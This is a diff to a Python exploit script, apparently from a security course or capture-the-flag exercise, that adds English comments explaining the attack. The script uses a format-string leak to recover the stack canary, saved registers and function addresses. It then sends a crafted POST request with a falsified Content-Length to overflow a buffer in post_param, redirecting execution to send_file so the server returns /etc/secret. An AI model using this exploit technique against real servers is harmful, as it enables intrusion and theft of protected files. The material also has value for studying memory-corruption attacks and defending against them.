@@ -10,10 +10,10 @@ import time
 import requests
 
 
-last = None		#teleutaio
-semi_last = None	#proteleutaio
-canery = None #4o apo to telos
-hellooo = None	#trito
+last = None		# this variable the adress of ebp and is used in order to find the address of the buffer 
+semi_last = None	# this variable is used in order to find the address of the send_file function 
+canery = None # this variable is used in order to store canary 
+hellooo = None	# this variable is used in order to find the address of the original return address of post_param
 
 
 def transform_address(address):
@@ -25,12 +25,12 @@ def transform_address(address):
 			mystring += '%c' % int(b)
 			print(int(b))
 		else:
-			mystring += '%c' % 0x26
+			mystring += '%c' % 0x26			# if b is \0, replace it with &
 			print(0x26)
 	return mystring
 
 
-
+# find the value of the previously mentioned variables by using the formatted string attack
 def set_variables():
 	global last
 	global semi_last
@@ -54,37 +54,35 @@ def set_variables():
 
 set_variables()
 
+# find the original values based on some stable offsets
+guessed_address=last - 0xB8	
+send_file = semi_last - 0x4f85 
+var_c0_value = canery	
+shutdown = hellooo - 0x1C7	# original return address of post_param
 
-guessed_address=last - 0xB8	#vale to teleutaio argument 
-send_file = semi_last - 0x4f85 #vale to proteleutaio argument 
-var_c0_value = canery	#vale to 4o apo to telos
 
-
-
+# variables used to perform addition of the wanted functions in the stack
 old_ebp = last
-old_esi = 0xF7F31000 #####dn paizei kapoio rolo
+old_esi = 0xF7F31000 # It's going to be  overridden, so its value doesn't matter
 old_ebx = var_c0_value
 
-#FFCD7398  FFCD73C8
-#FFCD7394  F7FD9000
-#FFCD7390  565FDF00
-
-# ebp FFDB6398: FFDB63E8
-# esi FFDB63B4:	F7F31000
-# ebx FFDB63B0: 565A4F00
 
 
-shutdown = hellooo - 0x1C7	#vres original return address of post_param
 print("send_file difference with semi_last")
 print(hex(semi_last - send_file))
-
-
-#hmm 565A3AF8
 
 
 print(hex(guessed_address))
 
 
+# /etc/secret& | !*80 | param_name | 8*! | name | c | 4*! | p_post_data | value | var_c0_value | old_ebx | old_esi | old_ebp |send_file | shutdown | guessed_address |'\0'| 
+# param_name is pointer to null 
+# name, c and value are going to be overridden, so we initialize them with thash
+# p_post_data is pointer to null 
+# old_esi is also initialized with trash
+# this part of the stack " old_ebx | old_esi | old_ebp |send_file " προσομοιώνει την κληση μια συνάρτησης από την 
+# When the post_param function finishes it will go back to the return address which is overwriten by the address of send_file. 
+# As return of the send adress we store the original return address of post_param, so the execution of the program will be completed
 
 shellcode = "/etc/secret&" 
 
@@ -109,7 +107,7 @@ s = Session()
 req = Request('POST', url, data=data)
 
 prepped = req.prepare()
-prepped.headers['Content-Length'] = 66
+prepped.headers['Content-Length'] = 66    # set the payload in something smaller in order to perform buffer overflow
 prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
 response = s.send(prepped)
 
